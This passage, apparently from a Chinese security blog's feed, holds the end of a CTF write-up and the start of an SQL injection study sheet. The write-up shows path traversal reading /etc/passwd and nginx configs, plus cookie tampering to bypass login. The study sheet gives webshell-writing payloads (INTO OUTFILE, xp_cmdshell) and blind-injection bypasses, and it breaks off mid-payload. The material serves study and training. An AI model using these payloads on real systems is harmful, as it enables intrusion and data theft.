class=&#34;line&#34;&gt;    &amp;lt;servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;LoginController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-class&amp;gt;com.wm.ctf.LoginController&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;LoginController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;url-pattern&amp;gt;/Login&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;DownloadController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-class&amp;gt;com.wm.ctf.DownloadController&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;DownloadController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;url-pattern&amp;gt;/Download&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;FlagController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-class&amp;gt;com.wm.ctf.FlagController&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;servlet-name&amp;gt;FlagController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;lt;url-pattern&amp;gt;/Flag&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;lt;/servlet-mapping&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/web-app&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;我们可以看到com.wm.FlagController，&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;servlet-name&amp;gt;FlagController&amp;lt;/servlet-name&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;servlet-class&amp;gt;com.wm.ctf.FlagController&amp;lt;/servlet-class&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/servlet&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;servlet-class里面的.代表的是路径/&lt;br /&gt;
然后下载FlagController.class文件试一试&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;filename=WEB-INF/classes/com/wm/ctf/FlagController.class&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;打开文件发现一串base编码，进行base64解密得到flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105438.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105438.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105439.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105439.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://www.cnblogs.com/yanze/p/10457924.html&#34;&gt;资料1&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.runoob.com/servlet/servlet-tutorial.html&#34;&gt;资料2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105440.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105440.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;百度杯2017二月-zone真题复现&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#百度杯2017二月-zone真题复现&#34;&gt;&lt;/a&gt; 百度杯2017二月-Zone真题复现&lt;/h3&gt;
&lt;p&gt;&lt;a href=&#34;https://www.ichunqiu.com/battalion?t=1&amp;amp;r=57475&#34;&gt;靶场&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://mayi077.gitee.io/2020/01/29/2017%E7%99%BE%E5%BA%A6%E6%9D%AF-%E4%BA%8C%E6%9C%88%E5%9C%BA-Zone/&#34;&gt;wp1&lt;/a&gt;&lt;br /&gt;
&lt;a href=&#34;https://www.ichunqiu.com/writeup/detail/4941&#34;&gt;wp2&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105441.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105441.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;1、 尝试burp抓包发现cookie中有个login，值为0，将0改为1后在访问首页，发现可以正常登入&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105442.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105442.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;2、单击 “manage” （此时还是需要用burp改login的值），点击框框发现比较特殊的url；猜测可能存在文件包含或者下载、读取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105443.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105443.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;3、测试访问url: &lt;a href=&#34;http://xxxxxx.com/manages/admin.php?module=ind%E2%80%A6/ex&amp;amp;name=php&#34;&gt;xxxxxx.com/manages/admin.php?module=ind…/ex&amp;amp;name=php&lt;/a&gt; 页面可以正常访问,猜测过滤了一遍…/再试一试绕过 url:url: &lt;a href=&#34;http://xxxxxx.com/manages/admin.php?module=ind%E2%80%A6/./ex&amp;amp;name=php&#34;&gt;xxxxxx.com/manages/admin.php?module=ind…/./ex&amp;amp;name=php&lt;/a&gt; 访问不正常；&lt;br /&gt;
说明过滤机制只是把…/进行了一次过滤，所以我们双写…/即可&lt;/p&gt;
&lt;p&gt;4、访问测试任意文件读取判断路径通过不断加…/ url:?module=…/./…/./…/./etc/passwd&amp;amp;name&lt;br /&gt;
（用户情况文件）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105544.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105544.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;5、查看下服务器是nginx。找一下它的配置文件，根据信息读取配置文件， url: manages/admin.php?module=…/./…/./…/./etc/nginx/nginx.conf 获得关键文件sites-enabled/default 并进行读取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105545.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105545.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;module=…/./…/./…/./etc/nginx/sites-enabled/default&amp;amp;name=获得web文件路径online-movies 并访问&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105546.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105546.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;6、发现可以利用的漏洞，因为有一个autoindex on也就是开启了目录遍历，我们可以访问这个/online-movies/，访问出现如下，再点击…/发现要进行验证，把login改为1后页面空白，我通过百度发现要/online-movies/…才能遍历（不清楚为什么）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105547.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105547.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;7、访问/online-movies…/&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;2021082316105548.png&#34; class=&#34;lazyload placeholder&#34; data-srcset=&#34;2021082316105548.png&#34; srcset=&#34;https://img2.baidu.com/it/u=2037979560,2772131037&amp;fm=26&amp;fmt=auto&amp;gp=0.jpg&#34; alt=&#34;在这里插入图片描述&#34; /&gt;&lt;/p&gt;
&lt;p&gt;8、地址为:online-movies…/var/www/html/flag.php构造url下载到flag.php获得flag&lt;/p&gt;
&lt;p&gt;到此这篇关于案例讲解WEB 漏洞-文件操作之文件下载读取的文章就介绍到这了,更多相关WEB 漏洞文件下载读取内容请搜索脚本之家以前的文章或继续浏览下面的相关文章希望大家以后多多支持脚本之家！&lt;/p&gt;
</content>
        <category term="安全" />
        <updated>2021-04-18T10:39:27.000Z</updated>
    </entry>
    <entry>
        <id>http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/</id>
        <title>SQL注入基础题</title>
        <link rel="alternate" href="http://example.com/2021/03/28/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/SQL%E6%B3%A8%E5%85%A5/"/>
        <content type="html">&lt;h1 id=&#34;sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql注入&#34;&gt;&lt;/a&gt; SQL注入&lt;/h1&gt;
&lt;h2 id=&#34;一-知识储备类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#一-知识储备类&#34;&gt;&lt;/a&gt; 一、知识储备类&lt;/h2&gt;
&lt;h3 id=&#34;1sql与nosql的区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1sql与nosql的区别&#34;&gt;&lt;/a&gt; 1.SQL与NoSQL的区别？&lt;/h3&gt;
&lt;p&gt;SQL：关系型数据库&lt;/p&gt;
&lt;p&gt;NoSQL：非关系型数据库&lt;/p&gt;
&lt;p&gt;存储方式：SQL具有特定的结构表，NoSQL存储方式灵活&lt;/p&gt;
&lt;p&gt;性能：NoSQL较优于SQL&lt;/p&gt;
&lt;p&gt;数据类型：SQL适用结构化数据，如账号密码；NoSQL适用非结构化数据，如文章、评论&lt;/p&gt;
&lt;h3 id=&#34;2常见的关系型数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2常见的关系型数据库&#34;&gt;&lt;/a&gt; 2.常见的关系型数据库？&lt;/h3&gt;
&lt;p&gt;mysql、sqlserver、oracle、access、sqlite、postgreSQL&lt;/p&gt;
&lt;h3 id=&#34;3常见的数据库端口&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3常见的数据库端口&#34;&gt;&lt;/a&gt; 3.常见的数据库端口？&lt;/h3&gt;
&lt;p&gt;关系型：&lt;/p&gt;
&lt;p&gt;mysql:3306&lt;/p&gt;
&lt;p&gt;sqlserver:1433&lt;/p&gt;
&lt;p&gt;orecal:1521&lt;/p&gt;
&lt;p&gt;PostgreSQL:5432&lt;/p&gt;
&lt;p&gt;db2:50000&lt;/p&gt;
&lt;p&gt;非关系型：&lt;/p&gt;
&lt;p&gt;MongoDB:27017&lt;/p&gt;
&lt;p&gt;redis:6379&lt;/p&gt;
&lt;p&gt;memcached:11211&lt;/p&gt;
&lt;h3 id=&#34;4简述数据库的存储引擎&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#4简述数据库的存储引擎&#34;&gt;&lt;/a&gt; 4.简述数据库的存储引擎&lt;/h3&gt;
&lt;p&gt;数据库存储引擎是数据库底层软件组织，数据库管理系统(DBMS)使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。&lt;/p&gt;
&lt;p&gt;InnoDB：主流的存储引擎，mysql默认存储引擎&lt;/p&gt;
&lt;p&gt;MyISAM：查询、插入速度快，不支持事务&lt;/p&gt;
&lt;p&gt;MEMORY：hash索引、BTREE索引&lt;/p&gt;
&lt;h3 id=&#34;5sql注入有哪几种注入类型&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#5sql注入有哪几种注入类型&#34;&gt;&lt;/a&gt; 5.SQL注入有哪几种注入类型？&lt;/h3&gt;
&lt;p&gt;从注入参数类型分：数字型注入、字符型注入、搜索型注入&lt;/p&gt;
&lt;p&gt;从注入方法分：基于报错、基于布尔盲注、基于时间盲注、联合查询、堆叠注入、内联查询注入、宽字节注入&lt;/p&gt;
&lt;p&gt;从提交方式分：GET注入、POST注入、COOKIE注入、HTTP头注入&lt;/p&gt;
&lt;h3 id=&#34;6sql注入的危害及防御&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#6sql注入的危害及防御&#34;&gt;&lt;/a&gt; 6.SQL注入的危害及防御？&lt;/h3&gt;
&lt;p&gt;危害：&lt;/p&gt;
&lt;p&gt;数据库泄露&lt;/p&gt;
&lt;p&gt;数据库被破坏&lt;/p&gt;
&lt;p&gt;网站崩溃&lt;/p&gt;
&lt;p&gt;服务器被植入木马&lt;/p&gt;
&lt;p&gt;防御：&lt;/p&gt;
&lt;p&gt;代码层面对查询参数进行转义&lt;/p&gt;
&lt;p&gt;预编译与参数绑定&lt;/p&gt;
&lt;p&gt;利用WAF防御&lt;/p&gt;
&lt;h3 id=&#34;7如果存在sql注入怎么判断不同的数据库&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#7如果存在sql注入怎么判断不同的数据库&#34;&gt;&lt;/a&gt; 7.如果存在SQL注入怎么判断不同的数据库？&lt;/h3&gt;
&lt;p&gt;根据报错信息判断&lt;/p&gt;
&lt;p&gt;根据执行函数返回的结果判断，如len()和lenth()，version()和@@version等&lt;/p&gt;
&lt;p&gt;根据注释符判断&lt;/p&gt;
&lt;h3 id=&#34;8mysql的网站注入50以上和50以下有什么区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#8mysql的网站注入50以上和50以下有什么区别&#34;&gt;&lt;/a&gt; 8.mysql的网站注入，5.0以上和5.0以下有什么区别？&lt;/h3&gt;
&lt;p&gt;从sql注入的角度来说，mysql5.0以下版本没有information_schema这个系统库，无法列出表名列名，只能暴力跑&lt;/p&gt;
&lt;h3 id=&#34;9mysql一个和两个什么区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#9mysql一个和两个什么区别&#34;&gt;&lt;/a&gt; 9.Mysql一个@和两个@什么区别&lt;/h3&gt;
&lt;p&gt;一个@是用户自定义变量&lt;/p&gt;
&lt;p&gt;两个@是系统变量，如@@version、@@user&lt;/p&gt;
&lt;h3 id=&#34;10mysql注入绕过常用的函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#10mysql注入绕过常用的函数&#34;&gt;&lt;/a&gt; 10.MYSQL注入/绕过常用的函数&lt;/h3&gt;
&lt;p&gt;注入常用函数：&lt;/p&gt;
&lt;p&gt;database() 返回当前数据库名&lt;/p&gt;
&lt;p&gt;user() 返回当前数据库用户名&lt;/p&gt;
&lt;p&gt;updatexml() 更新xml文档，常用于报错注入&lt;/p&gt;
&lt;p&gt;mid() 从指定字段中提取出字段的内容&lt;/p&gt;
&lt;p&gt;limit() 返回结果中的前几条数据或者中间的数据&lt;/p&gt;
&lt;p&gt;concat() 返回参数产生的字符串&lt;/p&gt;
&lt;p&gt;group_concat() 分组拼接函数&lt;/p&gt;
&lt;p&gt;count() 返回指定参数的数目&lt;/p&gt;
&lt;p&gt;rand() 参数0~1个随机数&lt;/p&gt;
&lt;p&gt;flood() 向下取整&lt;/p&gt;
&lt;p&gt;substr() 截取字符串&lt;/p&gt;
&lt;p&gt;ascii() 返回字符串的ascii码&lt;/p&gt;
&lt;p&gt;left() 返回字符串最左边指定个数的字符&lt;/p&gt;
&lt;p&gt;ord() 返回字符的ascii码&lt;/p&gt;
&lt;p&gt;length() 返回字符串长度&lt;/p&gt;
&lt;p&gt;sleep() 延时函数&lt;/p&gt;
&lt;p&gt;等价函数绕过，反之亦可：&lt;/p&gt;
&lt;p&gt;group_concat() ==&amp;gt; concat_ws()&lt;/p&gt;
&lt;p&gt;sleep() ==&amp;gt; benchmark()&lt;/p&gt;
&lt;p&gt;mid()、substr() ==&amp;gt; substring()&lt;/p&gt;
&lt;p&gt;user() ==&amp;gt; @@user&lt;/p&gt;
&lt;p&gt;updatexml() ==&amp;gt; extractvalue()&lt;/p&gt;
&lt;h3 id=&#34;11udf提权原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#11udf提权原理&#34;&gt;&lt;/a&gt; 11.UDF提权原理？&lt;/h3&gt;
&lt;p&gt;mysql支持用户自定义函数，将含有自定义函数的dll放入特定的文件夹，声明引入dll中的执行函数，使用执行函数执行系统命令&lt;/p&gt;
&lt;h3 id=&#34;12mssql差异备份原理及条件&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#12mssql差异备份原理及条件&#34;&gt;&lt;/a&gt; 12.MSSQL差异备份原理及条件？&lt;/h3&gt;
&lt;p&gt;原理：&lt;/p&gt;
&lt;p&gt;完整备份后，再次对数据库进行修改，差异备份会记录最后的LSN，将shell写入数据库，备份成asp即可getshell&lt;/p&gt;
&lt;p&gt;条件：&lt;/p&gt;
&lt;p&gt;MSSQL具有dbo或sa权限&lt;/p&gt;
&lt;p&gt;支持堆叠查询&lt;/p&gt;
&lt;p&gt;找到网站的绝对路径&lt;/p&gt;
&lt;h2 id=&#34;二-实操技能类&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#二-实操技能类&#34;&gt;&lt;/a&gt; 二、实操技能类&lt;/h2&gt;
&lt;h3 id=&#34;1sql注入写shell的条件用法&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1sql注入写shell的条件用法&#34;&gt;&lt;/a&gt; 1.SQL注入写shell的条件，用法&lt;/h3&gt;
&lt;p&gt;条件：&lt;/p&gt;
&lt;p&gt;当前用户具有dba权限&lt;/p&gt;
&lt;p&gt;找到网站绝对路径&lt;/p&gt;
&lt;p&gt;网站有可写目录&lt;/p&gt;
&lt;p&gt;mysql的配置secure_file_priv为空&lt;/p&gt;
&lt;p&gt;用法：&lt;/p&gt;
&lt;p&gt;mysql:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27; and 1=2 union select 1,2,&amp;#x27;&lt;/span&gt;shell内容&lt;span class=&#34;string&#34;&gt;&amp;#x27; into outfile &amp;quot;绝对路径\shell.php&amp;quot; %23&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;sqlserver:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;;EXEC master..xp_cmdshell &amp;#x27;&lt;/span&gt;echo &amp;quot;shell内容&amp;quot; &lt;span class=&#34;operator&#34;&gt;&amp;gt;&lt;/span&gt; 绝对路径\shell.asp&lt;span class=&#34;string&#34;&gt;&amp;#x27; --&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;2sql注入过滤了逗号怎么弄&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#2sql注入过滤了逗号怎么弄&#34;&gt;&lt;/a&gt; 2.sql注入过滤了逗号，怎么弄?&lt;/h3&gt;
&lt;p&gt;join绕过：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;union&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ((&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;)A &lt;span class=&#34;keyword&#34;&gt;join&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;)B &lt;span class=&#34;keyword&#34;&gt;join&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;3&lt;/span&gt;)C &lt;span class=&#34;keyword&#34;&gt;join&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; group_concat(&lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;(),&lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;,database(),&lt;span class=&#34;string&#34;&gt;&amp;#x27; &amp;#x27;&lt;/span&gt;,@&lt;span class=&#34;variable&#34;&gt;@datadir&lt;/span&gt;))D);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;3sleep被禁用后还能怎么进行sql注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#3sleep被禁用后还能怎么进行sql注入&#34;&gt;&lt;/a&gt; 3.sleep被禁用后还能怎么进行sql注入&lt;/h3&gt;
&lt;p&gt;benchmark代替sleep:&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;id&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; if(ascii(&lt;span class=&#34;built_in&#34;&gt;substring&lt;/span&gt;((database()),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;))&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;number&#34;&gt;115&lt;/span&gt;,(&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; benchmark(&lt;span class=&#34;number&#34;&gt;10000000&lt;/span&gt;,md5(&lt;span class=&#34;number&#34;&gt;0x41&lt;/span&gt;))),&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;comment&#34;&gt;--+&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;笛卡尔积盲注：&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;from&lt;/span&gt; ctf_test &lt;span class=&#34;keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;user&lt;/span&gt;&lt;span class=&#34;operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;#x27;1&amp;#x27;&lt;/span&gt; &lt;span class=&#34;keyword&#34;&gt;and&lt;/span&gt; &lt;span 